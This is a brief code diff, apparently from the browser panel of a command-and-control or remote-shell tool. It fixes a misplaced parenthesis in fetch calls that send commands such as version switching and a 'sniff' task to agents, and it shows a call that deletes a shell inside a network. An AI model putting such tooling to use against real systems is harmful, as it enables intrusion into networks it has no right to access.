@@ -515,7 +515,7 @@ class index{
 
         switchVer(value){
             let cmd = "SWITCH_VERSION*//*"+value;
-            fetch(this.server+"/`+web_route+`?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(cmd))+"&Taskid="+TaskId;
+            fetch(this.server+"/`+web_route+`?op=msg&uid="+this.uid+"&msg="+encodeURIComponent(cmd)+"&Taskid="+TaskId);
         }
     }
     
@@ -1617,7 +1617,7 @@ class lain_net{
         }else if(optionValue === "sniff"){
             var cmd="GET_U_FRIENDS*//*"+targetValue+"*//*"+targetListValue+"*//*"+sleepTimeValue;
         }
-        await fetch(this.server+"/`+web_route+`?op=msg&uid="+uid+"&msg="+encodeURIComponent(cmd))+"&Taskid=scanTask";
+        await fetch(this.server+"/`+web_route+`?op=msg&uid="+uid+"&msg="+encodeURIComponent(cmd)+"&Taskid=scanTask");
     }
     del_net(target,uid){
         fetch(this.server+"/`+web_route+`?op=delShellInnet&uid="+uid+"&target="+target)
